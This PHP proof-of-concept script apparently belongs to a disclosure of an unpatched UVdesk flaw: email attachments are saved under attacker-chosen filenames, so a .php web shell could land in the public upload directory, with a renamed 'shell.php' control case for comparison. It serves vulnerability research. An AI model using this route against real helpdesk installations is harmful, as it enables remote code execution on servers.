<?php
/**
 * PoC: UVdesk core-framework Localhost::uploadEmailAttachment() default renameFile=false
 * regression, never patched (sibling of the CVE-2024-0916 fix which only touched
 * uploadFile()). See README.md for the full writeup.
 *
 * This script exercises the REAL, unmodified vulnerable class
 * (core-framework/FileSystem/UploadManagers/Localhost.php, pinned commit
 * 3b319100eaae62e659caa0d2979659ac182f34ed) exactly the way
 * Services/TicketService.php::saveThreadEmailAttachments() calls it:
 *
 *     $uploadManager->uploadEmailAttachment($attachment, $prefix);   // no 3rd arg
 *
 * and feeds it a REAL PhpMimeMailParser\Attachment object obtained by parsing a
 * raw RFC822 email with the exact same library
 * (php-mime-mail-parser/php-mime-mail-parser ^7.0.0) that
 * mailbox-component/Services/MailboxService.php uses on every inbound email
 * ("$mailData['attachments'] = $parser->getAttachments();").
 *
 * The only thing NOT simulated is the IMAP fetch transport itself (network mail
 * delivery is infra, not application logic) - RefreshMailboxCommand.php is the
 * real cron entrypoint that would call this same code path against a live
 * mailbox in production.
 */

require __DIR__ . '/vendor/autoload.php';
require __DIR__ . '/src/TokenGenerator.php';
require __DIR__ . '/src/FileUploadServiceInterface.php';
require __DIR__ . '/src/Localhost.php';

use Symfony\Component\DependencyInjection\Container;
use Symfony\Component\HttpFoundation\RequestStack;
use Symfony\Component\HttpFoundation\File\UploadedFile;
use Webkul\UVDesk\CoreFrameworkBundle\FileSystem\UploadManagers\Localhost;
use PhpMimeMailParser\Parser;

// Fake DI container: Localhost::__construct only ever calls
// $container->get('kernel')->getProjectDir() - mirrors a Symfony app whose
// project root is /var/www/app (public/ is the document root, matching
// community-skeleton's real layout: public/assets is UPLOAD_DIRECTORY).
class FakeKernel
{
    public function getProjectDir()
    {
        return '/var/www/app';
    }
}

$container = new Container();
$container->set('kernel', new FakeKernel());

$uploadManager = new Localhost($container, new RequestStack());

echo "=== [1] VULNERABLE PATH: uploadEmailAttachment() (mailbox / email-piping ingestion) ===\n";
echo "Parsing a real inbound email with php-mime-mail-parser (same lib mailbox-component uses)...\n";

$parser = new Parser();
$parser->setText(file_get_contents(__DIR__ . '/malicious-email.eml'));
$attachments = $parser->getAttachments();

foreach ($attachments as $attachment) {
    echo "Attacker-controlled MIME attachment filename: " . $attachment->getFilename() . "\n";

    // EXACT call TicketService::saveThreadEmailAttachments() makes - no 3rd arg,
    // so it inherits Localhost::uploadEmailAttachment()'s own default, which is
    // `false` (not the interface's declared `true`).
    $prefix = 'threads/999';
    $result = $uploadManager->uploadEmailAttachment($attachment, $prefix);

    echo "uploadEmailAttachment() result: " . json_encode($result) . "\n";
    echo ">>> File written to: " . $result['path'] . "\n";
}

echo "\n=== [2] CONTROL: uploadFile() (direct web-UI ticket-attachment path, the ONE function CVE-2024-0916's fix touched) ===\n";

$tmpPath = sys_get_temp_dir() . '/control-shell.php';
file_put_contents($tmpPath, "<?php echo 'should never be reached with a .php extension'; ?>");

$controlUpload = new UploadedFile($tmpPath, 'shell.php', 'application/octet-stream', null, true);
$controlPrefix = 'threads/999-control';
$controlResult = $uploadManager->uploadFile($controlUpload, $controlPrefix);

echo "uploadFile() result: " . json_encode($controlResult) . "\n";
echo ">>> File written to: " . $controlResult['path'] . "\n";
echo ($controlResult['name'] !== 'shell.php')
    ? "CONFIRMED: uploadFile() renamed the file away from attacker's chosen name/extension (the 2025 fix works HERE).\n"
    : "UNEXPECTED: uploadFile() did not rename (should not happen post-fix).\n";
